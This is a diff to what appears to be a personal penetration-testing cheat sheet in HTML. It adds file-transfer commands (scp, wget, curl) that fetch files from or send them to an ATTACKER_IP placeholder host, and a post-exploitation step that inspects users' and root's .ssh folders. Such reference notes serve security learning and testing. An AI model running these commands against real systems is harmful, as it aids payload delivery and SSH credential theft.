@@ -108,6 +108,10 @@ Topic contains:
 			<p> &nbsp;&nbsp; dhcp-send-hostname=false
 		<li> To allow traffic routing on your part (Main rule for MITM)
 			<p> <pre><code> sudo sysctl -w net.ipv4.ip_forward=1 </code></pre>
+		<li> Transferring files
+			<pre><code> scp &lt;FILE_NAME> &lt;USERNAME>@&lt;TARGET_HOST>:&lt;/path/to/file/on/attacker_machine></code></pre>
+			<pre><code> wget http://&lt;ATTACKER_IP>:&lt;ATTACKER_PORT>/&lt;FILE_NAME> </code></pre>
+			<pre><code> curl http:///&lt;ATTACKER_IP>:&lt;ATTACKER_PORT>/&lt;FILE_NAME> -o &lt;FILE_NAME> </code></pre>
 	</ul>
  <h4> &nbsp;&nbsp;&nbsp; Never run these Linux commands: </h4>
  	<ul>
@@ -740,6 +744,7 @@ My GitHub <a href='https://github.com/Kode-n-Rolla?tab=stars'>stars</a> where I 
 			<li> Check out what subnet did land in - <code> ifconfig </code> or <code> ip -a </code>
 			<li> Check out kernel ( <code>uname -a</code> ) and OS version ( <code>cat /etc/os-release</code> )
 			<li> Check out screen version - <code> screen -v</code>
+			<li> Check out .ssh folder in <code>/home/&lt;USERNAME>/.ssh</code> or <code>/root/.ssh</code>
 			<li> Check out all environment variables <code> env </code>
 			<li> Check out login shells exist on the server - <code> cat /etc/shells </code> 
 			<li> Check out Cron Tab:
